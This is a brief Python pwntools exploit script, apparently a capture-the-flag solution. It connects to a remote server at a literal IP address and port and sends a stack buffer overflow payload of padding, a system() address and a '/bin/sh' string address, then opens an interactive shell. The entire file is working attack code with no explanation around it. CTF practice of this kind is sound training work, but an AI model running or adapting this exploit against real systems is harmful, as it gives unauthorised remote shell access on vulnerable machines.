from pwn import *

#sh = process('./pwn')
sh = remote('111.200.241.244', 49419)

_bin_sh_addr = 0x804a024
_system_addr = 0x804845c

padding = b'a'*(0x88+4)


payload = padding + p32(_system_addr) + p32(_bin_sh_addr)

sh.sendline(payload)
sh.interactive()
